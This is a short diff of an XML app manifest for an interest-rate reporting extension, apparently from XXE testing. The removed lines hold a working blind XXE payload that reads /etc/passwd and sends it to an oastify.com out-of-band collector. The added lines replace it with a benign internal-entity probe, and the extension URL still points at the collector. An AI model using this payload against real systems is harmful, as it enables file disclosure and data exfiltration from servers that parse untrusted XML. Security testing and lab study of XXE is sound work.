@@ -1,8 +1,4 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ELEMENT foo (#ANY)>
-<!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "https://1kmldejxomk79rc8a8etan686zcq0poe.oastify.com/?%xxe;">]><foo>&blind;</foo>
+<!DOCTYPE test [<!ENTITY desc "test XXE">]>
 <app>
      <id>gj8dl19d0</id>
      <name>Interest Rates Now</name>
@@ -10,7 +6,7 @@
      <description>A tool to see the current interest rate</description>
      <extensionpoint>
           <location>REPORTING_VIEW</location>
-          <label>Interest Rates</label>
+          <label>&desc;</label>
           <url>https://1kmldejxomk79rc8a8etan686zcq0poe.oastify.com/%xxe</url>
      </extensionpoint>
 </app>
